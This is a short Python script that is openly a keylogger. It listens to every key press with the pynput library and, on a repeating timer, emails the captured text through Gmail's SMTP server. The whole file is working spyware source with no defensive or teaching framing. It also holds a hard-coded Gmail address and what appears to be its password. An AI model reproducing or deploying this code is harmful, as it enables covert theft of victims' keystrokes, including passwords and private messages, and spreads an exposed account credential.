#!usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylloger:

	def __init__(self, time_interval):
		self.log = "a Target hunted"
		self.interval = time_interval


	def append_to_log(self, string):
		self.log = self.log + string


	def process_key_press(self, key):
		try:
			currnt_key = str(key.char)
		except AttributeError:
			if key == key.space:
				currnt_key = " "
			else:
				currnt_key = " " +str(key) + " "

		self.append_to_log(currnt_key)

	def sendemail(self, email, password, msg):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, msg)
		server.quit()



	def report(self):
		print(self.log)
		self.sendemail("majjadolaya@gmail.com", "beoutforyou2003", "\n\n" + self.log)
		self.log = "" 
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start(self): 
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

		with keyboard_listener:
			self.report()
			keyboard_listener.join()